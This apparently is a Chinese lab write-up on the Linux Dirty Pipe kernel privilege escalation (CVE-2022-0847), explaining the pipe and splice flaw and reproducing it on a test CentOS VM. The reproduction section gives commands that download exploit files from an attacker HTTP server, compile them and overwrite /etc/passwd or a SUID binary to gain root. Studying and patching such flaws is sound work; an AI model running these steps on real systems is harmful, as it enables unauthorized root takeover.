[TOC]



# ==Linux脏管道提权==

## Dirty Pipe提权漏洞（CVE-2022-0847）复现

### 一、漏洞简介

 2022年3月7日，国外安全研究员 Max Kellermann 披露了一个 Linux 内核本地提权漏洞 CVE-2022-0847，因原理与脏牛漏洞（Dirty Cow）类似，发现者将此漏洞命名为 “Dirty Pipe”。攻击者通过利用此漏洞可进行任意可读文件覆写，从而进行提权。

受影响版本：内核版本为5.8及以上，目前在内核版本5.16.11、5.15.25 和 5.10.102 中已修复。

漏洞利用条件：

 1.目标系统的内核版本为5.8及以上且未修复此漏洞。

 2.被覆写的目标文件必须拥有可读权限。

### 二、漏洞原理

前置知识：

 页式内存管理：Linux 使用分页式的内存管理，将内存空间分成长度固定的页(Page)，页面的标准大小为4KB。

 文件描述符：在形式上是一个非负整数，它是一个索引值，指向内核为每一个进程所维护的该进程打开文件的记录表。当程序打开一个现有文件或者创建一个新文件时，内核向进程返回一个文件描述符。

#### 2.1 管道（pipe）

 管道(Pipe)：一种经典的进程间通信方式，它包含一个输入端和一个输出端，程序将数据从一段输入，从另一端读出。

##### 2.1.1 环形缓冲区（Ring Buffer）

 在内核中，为了实现管道这种数据通信，管道使用了环形缓冲区来存储数据。而环形缓冲区的原理是把一个缓冲区当成是首尾相连的环，其中通过读指针和写指针来记录读操作和写操作位置，它通常由16个页面(Page)组成，且可以被循环利用。

![image-20220812115250081](https://gitee.com/ymq_typroa/typroa/raw/main/20220812115257.png)

 当向管道写数据时，从写指针指向的位置开始写入，并且将写指针向前移动。而从管道读取数据时，从读指针开始读入，并且将读指针向前移动。

##### 2.1.2 管道对象

**pipe_inode_info** 对象

 在 Linux 内核中，管道使用 pipe_inode_info 对象来进行管理。相关字段如下：

- bufs：管道缓冲区循环数组。
- head：标识队列头。
- tail ：标识队列尾。
- …….

**pipe_buffer** 对象

 环形缓冲区是由 16 个 pipe_buffer 对象组成。相关字段如下：

- page：指向 pipe_buffer 对象占用的内存页。
- offset：如果进程正在读取当前内存页的数据，那么 offset 指向正在读取当前内存页的偏移量。
- len：表示当前内存页拥有未读数据的长度。

二者关系如图：

![image-20220812173244312](https://gitee.com/ymq_typroa/typroa/raw/main/20220812173244.png)

##### 2.1.3 管道的写过程

 当我们向管道内写入数据时，会调用到名为 pipe_write() 的函数进行写入操作，可能的情况如下：

1. 若管道非空且上一个 pipe_buffer指向的内存页未满(该buffer 会设置 PIPE_BUF_FLAG_CAN_MERGE 标志位），则先尝试向上个buffer中写入数据。
2. 若管道为空或者上一个 pipe_buffer指向的内存页不可写（未设置 PIPE_BUF_FLAG_CAN_MERGE 标志位），则分配新页面后写入。

 从上面的描述可以知道管道中使用 PIPE_BUF_FLAG_CAN_MERGE 以标识一个 pipe_buffer 是否已经分配了可以写入的空间，在大循环中若对应 pipe_buffer 没有设置该标志位（刚被初始化），则会新分配一个页面供写入，并设置该标志位

##### 2.1.4 管道的读过程

 从管道中读出数据则是通过名为 pipe_read() 函数来读取，主要是读取 pipe_buffer 指向的内存页上的数据，若一个 pipe_buffer 的内容被读完了则将其出列。但纵使一个 pipe_buffer 对应的内存页上的数据被读完了，其也不会被立即释放，还会投入到下一次使用中，因此会保留 PIPE_BUF_FLAG_CAN_MERGE 标志位。

#### 2.2 文件与管道间数据拷贝——splice

 当我们想要将一个文件的数据拷贝到另一个文件时，可以打开两个文件后将源文件数据读入后再写入目标文件，但这样的做法需要在用户空间与内核空间之间来回进行数据拷贝，开销大。为了减少开销，于是就有了splice。

 splice 系统调用用于在文件与管道之间进行数据拷贝，其将内核空间与用户空间之间的数据拷贝转变为了内核空间内的数据拷贝，从而避免了数据在用户空间与内核空间之间的拷贝造成的开销。splice 系统调用本质上是利用管道在内核空间中进行数据拷贝，当想要将数据从一个文件拷贝到另一个文件中，只需要先创建一个管道，之后使用 splice 系统调用将数据从源文件描述符拷贝到管道中，再使用 splice 系统调用将数据从管道中拷贝到目的文件描述符即可。

 在本次漏洞中主要利用的是splice从文件读取数据到管道的功能，而其原理就是将 pipe_buffer 对应的内存页地址 (page) 设置为文件映射的内存页地址。

#### 2.3 漏洞分析

 dirtypipe提权漏洞利用过程如下：

1. 首先将整个管道读写了一轮，此时所有的 pipe_buffer 都保留了 PIPE_BUF_FLAG_CAN_MERGE 标志位。
2. 利用 splice 将数据从文件读取一个字节（读入不多于一个页面的数据）到管道上，此时 pipe_buffer 指向文件映射的页面。
3. 在 splice 中建立完页面映射后，此时 head 会指向下一个 pipe_buffer，此时再向管道中写入数据，因为上一个 pipe_buffer 对应的内存页没有写满，于是会将数据拷贝到上一个 pipe_buffer 对应的内存页——即文件映射的内存页，由于 PIPE_BUF_FLAG_CAN_MERGE 标志位仍保留着，因此内核会认为该内存页可以被写入，从而完成了越权写入文件的操作。

 该提权漏洞的利用点为 splice 系统调用中未清空 pipe_buffer 的 PIPE_BUF_FLAG_CAN_MERGE 标志位，管道页面保持为可写入的状态，于是就可以进行越权写入内容到只读文件中。

 这个漏洞与脏牛十分类似，都是越权对文件进行写入，不同的是脏牛需要去撞条件竞争的概率，而该漏洞可以稳定触发，但是脏牛可以直接写整个文件，而该漏洞不能在管道边界上写入。

### 三、漏洞复现

#### 3.1 复现环境

 操作系统：Centos7

 内核版本：5.10.48

 用户：zhangsan （普通用户）

 漏洞利用工具：

（1）https://github.com/imfiver/CVE-2022-0847（覆写/etc/passwd）。

（2）https://haxx.in/files/dirtypipez.c（覆盖 SUID 程序提权）。

 文件下载服务器：kali （IP：192.168.219.134），此处将利用工具放于kali任意目录下，并在该目录下使用“python -m SimpleHTTPServer”命令开启一个简单的HTTP服务，默认8000端口，用于被攻击服务器下载exp。

##### 3.1.1 环境搭建

VMware安装Centos7，系统镜像为CentOS-7-x86_64-Minimal-2009.iso（https://mirrors.tuna.tsinghua.edu.cn/centos/7.9.2009/isos/x86_64/CentOS-7-x86_64-Minimal-2009.iso）

使用rpm包安装5.10.48版本的内核，步骤如下：

1.下载以下rpm包。

kernel-ml-5.10.48-1.el7.x86_64.rpm（https://dl.lamp.sh/kernel/el7/kernel-ml-5.10.48-1.el7.x86_64.rpm）
kernel-ml-devel-5.10.48-1.el7.x86_64.rpm（https://dl.lamp.sh/kernel/el7/kernel-ml-devel-5.10.48-1.el7.x86_64.rpm）
kernel-ml-headers-5.10.48-1.el7.x86_64.rpm（https://dl.lamp.sh/kernel/el7/kernel-ml-headers-5.10.48-1.el7.x86_64.rpm）

```
wget https://dl.lamp.sh/kernel/el7/kernel-ml-5.10.48-1.el7.x86_64.rpm
wget https://dl.lamp.sh/kernel/el7/kernel-ml-devel-5.10.48-1.el7.x86_64.rpm
wget https://dl.lamp.sh/kernel/el7/kernel-ml-headers-5.10.48-1.el7.x86_64.rpm
```

2.yum安装上述rpm包。

```
yum localinstall kernel-* --skip-broken
```

3.查看启动顺序。

```
awk -F\' '$1=="menuentry " {print $2}' /etc/grub2.cfg
```

![image-20220811174142658](https://gitee.com/ymq_typroa/typroa/raw/main/20220811174142.png)

4.设置启动顺序，根据上一步的查询结果。

```
grub2-set-default 0
```

5.重启主机，而后使用 “uname -a” 命令查看当前系统内核版本信息。

6.创建普通用户zhangsan

```
useradd zhangsan
passwd zhangsan  # 设置用户密码
```

7.使用 zhangsan 登录系统。

#### 3.2 复现过程

使用此漏洞我们可以覆写拥有可读权限的文件，于是可以使用以下两种利用思路进行提权：

 1.修改/etc/passwd文件，将root的密码改为空，而后使用 su 命令切换至root用户完成提权。

 2.覆盖SUID 程序，从而进行提权。

##### 3.2.1 覆写/etc/passwd进行提权

```
wget -c http://192.168.219.134:8000/Dirty-Pipe.sh
chmod +x Dirty-Pipe.sh
./Dirty-Pipe.sh
```

![image-20220811172637595](https://gitee.com/ymq_typroa/typroa/raw/main/20220811172644.png)

##### 3.2.2 覆盖 SUID 程序提权

```
wget -c http://192.168.219.134:8000/dirtypipez.c
gcc -o dirtypipez dirtypipez.c
find / -perm -u=s -type f 2>/dev/null # 查找 SUID 程序
./dirtypipez /usr/bin/su
```

![image-20220811173024436](https://gitee.com/ymq_typroa/typroa/raw/main/20220811173024.png)

### 四、修复建议

1. 更新系统内核为已修复该漏洞的版本。

### 五、参考文章

1. CVE-2022-0847 Dirty Pipe Linux 内核提权漏洞（https://blog.zjun.info/tech/cve-2022-0847）
2. Linux 内核提权 DirtyPipe（CVE-2022-0847）漏洞分析（https://view.inews.qq.com/a/20220415A0E82700）
3. CVE-2022-0847 “Dirty Pipe”漏洞复现及简要分析（https://xz.aliyun.com/t/11016）
4. 图解 | Linux进程通信 - 管道实现（https://cloud.tencent.com/developer/article/1890707）